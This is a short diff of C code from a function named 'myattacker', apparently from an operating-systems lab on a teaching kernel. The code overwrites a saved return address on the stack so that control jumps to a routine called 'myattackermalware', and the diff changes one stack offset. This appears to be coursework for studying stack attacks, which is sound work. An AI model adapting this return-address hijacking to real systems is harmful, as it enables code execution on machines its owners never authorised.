@@ -17,7 +17,7 @@ void myattacker()
 	*return_add = &myattackermalware; //set the return value after sleep is called to malware code
 	kprintf(" return_add: 0x%08X ebpVal: 0x%08X\n", (return_add), *(return_add));
 
-	return_add = ebp+502;
+	return_add = ebp+498;
 	*return_add = *(ebp+505);
 	kprintf(" return_add: 0x%08X ebpVal: 0x%08X\n", (return_add), *(return_add));
 	return;
